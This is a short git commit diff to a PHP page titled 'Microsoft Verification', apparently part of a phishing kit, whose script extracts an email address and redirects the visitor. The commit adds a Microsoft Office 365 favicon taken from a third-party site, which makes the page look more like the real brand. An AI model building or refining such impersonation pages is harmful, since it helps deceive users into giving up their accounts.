7ac463ec022abf9219e8f41597800f73ef760d83
wick3dhub <130564370+wick3dhub@users.noreply.github.com>
2025-04-02 15:27:19 +0100

    Update index.php

--- oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45/index.php
+++ oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45/index.php
@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft Verification</title>
+    <link rel="icon" href="https://webtech.pt/wp-content/uploads/2020/12/microsoft-office-365-sharepoint.svg" type="image/x-icon">
     <script>
         window.onload = function() {
             // Function to handle the redirection after extracting the email
